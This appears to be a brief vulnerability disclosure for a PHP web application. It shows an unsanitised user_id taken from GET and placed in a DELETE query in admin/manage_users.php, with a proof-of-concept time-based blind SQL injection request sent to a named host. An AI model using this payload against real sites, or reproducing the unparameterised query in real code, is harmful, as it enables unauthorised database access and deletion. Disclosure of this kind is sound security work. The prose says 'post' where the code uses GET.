### Vulnerability file address

`admin/manage_users.php` from line 4,The $user_id parameter is controllable, the parameter user_id can be passed through post, and the $user_id is not protected from sql injection, resulting in sql injection

```php
if(isset($_GET['action']) && $_GET['action']!="" && $_GET['action']=='delete')
{
$user_id=$_GET['user_id'];
/*this is delet quer*/
mysqli_query($con,"delete from user_info where user_id='$user_id'")or die("query is incorrect...");
}
```

### POC

```http
GET /admin/manage_users.php?user_id=' OR (SELECT 7316 FROM (SELECT(SLEEP(5)))lqxS)-- nZPW&action=delete HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.onsp.net/admin/manage_users.php?action=1&user_id=5
Cookie: PHPSESSID=iq8aj0cq3p4rf0s9m3864gtkr0
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220721154354881](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220721154354.png)